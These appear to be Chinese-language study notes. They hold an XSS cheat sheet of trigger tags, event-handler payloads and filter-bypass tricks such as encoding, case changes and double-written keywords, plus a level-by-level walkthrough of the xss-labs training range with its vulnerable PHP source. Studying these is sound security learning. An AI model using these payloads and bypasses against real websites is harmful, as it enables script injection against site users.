# 总结

## 常见触发标签

> [XSS常见的触发标签_可以触发xss的标签_H3rmesk1t的博客-CSDN博客](https://blog.csdn.net/LYJ20010728/article/details/116462782)

### 无过滤

`<script>`

```php+HTML
<scirpt>alert("xss");</script>
```

`<img>`

```php+HTML
图片加载错误时触发
<img src="x" onerror=alert(1)>
<img src="1" onerror=eval("alert('xss')")>
鼠标指针移动到元素时触发
<img src=1 onmouseover="alert(1)">
鼠标指针移出时触发
<img src=1 onmouseout="alert(1)">
```

`<a>`

```php+HTML
<a href="https://www.qq.com">qq</a>
<a href=javascript:alert('xss')>test</a>
<a href="javascript:a" onmouseover="alert(/xss/)">aa</a>
<a href="" onclick=alert('xss')>a</a>
<a href="" onclick=eval(alert('xss'))>aa</a>
<a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016>aa</a>
```

`<input>`

```php+HTML
<input onfocus="alert('xss');">
竞争焦点，从而触发onblur事件
<input onblur=alert("xss") autofocus><input autofocus>
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<input onfocus="alert('xss');" autofocus>
<input name="name" value="">
<input value="" onclick=alert('xss') type="text">
<input name="name" value="" onmouseover=prompt('xss') bad="">
<input name="name" value=""><script>alert('xss')</script>
按下按键时触发
<input type="text" onkeydown="alert(1)">
按下按键时触发
<input type="text" onkeypress="alert(1)">
松开按键式时触发
<input type="text" onkeyup="alert(1)">
```

`<from>`

```php+HTML
<form action=javascript:alert('xss') method="get">
<form action=javascript:alert('xss')>
<form method=post action=aa.asp? onmouseover=prompt('xss')>
<form method=post action=aa.asp? onmouseover=alert('xss')>
<form action=1 onmouseover=alert('xss)>
<form method=post action="data:text/html;base64,<script>alert('xss')</script>">
<form method=post action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

`<iframe>`

```php+HTML
<iframe onload=alert("xss");></iframe>
<iframe src=javascript:alert('xss')></iframe>
<iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
<iframe src="data:text/html;base64,<script>alert('xss')</script>">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
<iframe src="aaa" onmouseover=alert('xss') /><iframe>
<iframe src="javascript&colon;prompt&lpar;``xss``&rpar;"></iframe>(````只有两个``)
```

`<svg>`

```php+HTML
<svg onload=alert(1)>
```

`<body>`

```php+HTML
<body onload="alert(1)">
利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发
<body onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
```

`<button>`

```php+HTML
元素上点击鼠标时触发
<button onclick="alert(1)">text</button>
```

`<p>`

```php+HTML
元素上按下鼠标时触发
<p onmousedown="alert(1)">text</p>
元素上释放鼠标时触发
<p onmouseup="alert(1)">text</p>
```

`<details>`

```php+HTML
<details ontoggle="alert('xss');">
使用open属性触发ontoggle事件，无需用户去触发
<details open ontoggle="alert('xss');">
```

`<select>`

```php+HTML
<select onfocus=alert(1)></select>
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<select onfocus=alert(1) autofocus>
```

`<video>`

```php+HTML
<video><source onerror="alert(1)">
```

`<audio>`

```php+HTML
<audio src=x onerror=alert("xss");>
```

`<textarea>`

```php+HTML
<textarea onfocus=alert("xss"); autofocus>
```

`<keygen>`

```php+HTML
<keygen autofocus onfocus=alert(1)> //仅限火狐
```

`<marquee>`

```php+HTML
<marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以
```

`<isindex>`

```php+HTML
<isindex type=image src=1 onerror=alert("xss")>//仅限于IE
```

利用link远程包含js文件

```php+HTML
在无CSP的情况下才可以
<link rel=import href="http://127.0.0.1/1.js">
```

javascript伪协议

```php+HTML
<a href="javascript:alert('xss');">xss</a>
<iframe src=javascript:alert('xss');></iframe>
<img src=javascript:alert('xss')>//IE7以下
<form action="Javascript:alert(1)"><input type=submit>
```

expression属性

```php+HTML
<img style="xss:expression(alert('xss''))"> // IE7以下
<div style="color:rgb('' x:expression(alert(1))"></div> //IE7以下
<style>#test{x:expression(alert(/XSS/))}</style> // IE7以下
```

background属性

```php+HTML
<table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效
```

### 有过滤

过滤空格：用 / 、换行符等代替空格

```php+HTML
<img/src="x"/onerror=alert("xss");>
```

过滤关键字

```php+HTML
大小写绕过
<ImG sRc=x onerRor=alert("xss");>
双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)
<imimgg srsrcc=x onerror=alert("xss");>
字符拼接(利用eval)
<img src="x" onerror="a=aler;b=t;c='(xss);';eval(a+b+c)">
字符拼接(利用top)
<script>top["al"+"ert"](``xss``);</script>(只有两个``这里是为了凸显出有`符号)
```

其它字符混淆：有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了。可利用注释、标签的优先级等

```php+HTML
<<script>alert("xss");//<</script>
<scri<!--test-->pt>alert("hello world!")</scri<!--test-->pt>
<title><img src=</title>><img src=x onerror="alert(``xss``);"> 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
```

编码绕过

```php+HTML
Unicode编码绕过
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">
<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
url编码绕过
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
Ascii码绕过
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
Hex绕过
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
八进制绕过
<img src=x onerror=alert('\170\163\163')>
base64绕过
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

过滤双引号，单引号

```php+HTML
如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号
<img src="x" onerror=alert(``xss``);>
使用编码绕过，具体看上面列举的例子
```

过滤括号

```php+HTML
当括号被过滤的时候可以使用throw来绕过
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

过滤url地址

```php+HTML
使用url编码
<img src="x" onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``>
使用IP
<img src="x" onerror=document.location=``http://2130706433/``>十进制
<img src="x" onerror=document.location=``http://0177.0.0.01/``>八进制
<img src="x" onerror=document.location=``http://0x7f.0x0.0x0.0x1/``>十六进制
<img src="x" onerror=document.location=``//www.baidu.com``>html标签中用//可以代替http://
使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)
使用中文逗号代替英文逗号
<img src="x" onerror="document.location=``http://www。baidu。com``">//会自动跳转到百度
```



# xss_labs

> 参考wp：
>
> * [xss-labs靶场实战全通关详细过程（xss靶场详解）_金 帛的博客-CSDN博客](https://blog.csdn.net/l2872253606/article/details/125638898)
> * [xss-labs 靶场详细攻略（附常用payload） - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/338123.html)

## level 1

payload

```
<script>alert(1)</script>
```

## level 2

payload

```
"> <script>alert(1)</script> <"
```

## level3

先随便尝试一下发现 `'> <script>alert("hi")</script> <'` 输入，输出有实体化变成了 `<input name="keyword" value="" &gt;="" &lt;script&gt;alert(&quot;hi&quot;)&lt;="" script&gt;="" &lt;''="">` 

后端代码

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>	
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
```

其中 `.htmlspecialchars` 把预定义的字符&、”、 ’、<、>转换为HTML实体，防止浏览器将其作为HTML元素。但是默认是只编码双引号的，而且单引号无论如何都不转义

```
& → &amp;
" → &quot;
' → '
< → &lt;
> → &gt;
```

换一种方式，用其他的事件。

onfocus事件：onfocus事件在元素获得焦点时触发，最常与 `<input>`、`<select>` 和 `<a>` 标签一起使用。`<input>` 标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码。比如 `<input type="text" onfocus="要调用的方法()">`

payload

```
'onclick='alert(1)
'onfocus='javascript:alert()
```

## level 4

和3同理，看前端是双引号闭合，换成双引号就行 

payload

```
"onfocus="javascript:alert()
```

## level 5

尝试输入，`on` 会被改成 `o_n`，`<script>` 会被替换成 `<scr_ipt>`。

查看后端源码，确实针对这两个标签有过滤。且有 `strtolower` 转换成小写，大小写绕过无效，只能换别的标签的注入。

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

payload

```
"> <a href=javascript:alert()>xxx</a> <"
```

## level 6

测试发现 on、script、href都会被替换，但是大小写可以绕过。

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

payload

```
"> <a hRef=javascript:alert()>xxx</a> <"
```

## level 7

on、script、href这些词大小写没有用，但是双拼写可以。看后端源码可以验证这点

```php
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

payload

```
"> <a hrhrefef=javascrscriptipt:alert()>xxx</a> <"
```

## level 8

先筛关键字测试一下 `" sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()>` ，变成了 `" sr_c da_ta o_nfocus <scr_ipt> <a hr_ef=javascr_ipt:alert()>` ，大小写无效，黑名单也不少。

后端。这里明明有对引号进行实体编码，但是我输入的时候没有，不知道什么原因，但是不影响解题

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
```

利用unicode编码绕过，href会自动解析unicode编码。利用在线工具编码，[HTML字符实体转换，网页字符实体编码 (qqxiuzi.cn)](https://www.qqxiuzi.cn/bianma/zifushiti.php)

payload

```
javascript:alert()
&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x29;
```

## level 9

输入啥都是显示连接不合法，“不合法“就考虑到是不是规范了http格式，查一下源码，在黑名单的基础上有检测 `http://`

```php
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```

payload。记得在 `http://` 前加注释符号，不然会影响alert执行

```
&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x29;//http://
```

## level 10

没有输入框，看前端发现有三个被隐藏了的，分别是 t_link、t_history、t_sort，挨个试，发现只有 t_sort 有用，看源码果然只get了t_sort。

```php
$str11 = $_GET["t_sort"];
```

payload。没有输入位置就直接写在url里。

```
http://localhost/xsslabs/level10.php?t_sort=" type="text" onclick="alert('xss')
```

## level 11

和10一样也被标为”hidden“属性了，get、post无果，然后hidden属性的标签比上一题多一个 `t_ref`，抓个包看看。get请求完全没反应，用post请求 `t_ref=http://localhost/xsslabs/level10.php?t_sort=%22%20type=%22text%22%20onclick=%22alert(%27xss%27)` 发现报文中多了一个 referer属性：`Referer: http://172.25.100.239/xsslabs/level11.php?t_ref=http://localhost/xsslabs/level10.php?t_sort=%22%20type=%22text%22%20onclick=%22alert(%27xss%27)`

![image-20230717124228219](https://github.com/LyrisLaurier/notes/assets/94295495/768375f5-8047-4529-b6db-19c080a826b4)

![image-20230717124253604](https://github.com/LyrisLaurier/notes/assets/94295495/f603c351-1349-47c6-8388-f38a559fbd87)

查看后端代码

```php
<h1 align=center>欢迎来到level11</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

HTTP Referer 被获取到 str11 → str22 → str33 → 执行alert()。抓取post请求包修改Referer头即可

payload

```
Referer: " type="text" onclick="alert('xss')
```

## level 12

和11的思路类似，发现有 `<input name="t_ua" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0" type="hidden">` ，所以猜测其余步骤一致，注入位置换成HTTP报文的User-Agent字段

payload

```
User-Agent: " type="text" onmousemove="alert(1)
```

## level 13

同理，这次换成cookie，注意cookie里有变量“user”，是赋值给它别把它删了

payload

```
Cookie: user=" type="text" onmousemove="alert(1)
```

## *level 14

好像是说跳转后的那个网站过期了就不行了

## level 15

这一关的html标签多了个”ng-include‘：用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。

所以利用别的关卡，比如level1，先测试一下 `http://172.25.106.44/xsslabs/level15.php?src='level1.php'` ，此时出现了level1的图，说明有用。

payload

```
?src='level1.php?name=<img src=1 onerror=alert(1)>'
```

> 这里不能直接用 `<script>alert(1)</script>` 这种直接弹窗的，而是要用点击触发的。这里原因没搞清楚为什么
>
> ng-include文件包涵，可以无视html实体化

## level 16

> 火狐浏览器我遇到了问题，它的网页前端和edge显示的不一样。火狐看不出来过滤但是edge可以，多注意一下

拿 `?keyword=" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <sCriPt> <a hReF=javascript:alert()> &#106; ` 试一下发现script实体化了，空格、符号等也被过滤了。用 %0a换行替代一下空格试试

paylaod

```
?keyword=<img%0asrc=1%0aonerror=alert(1)>
```

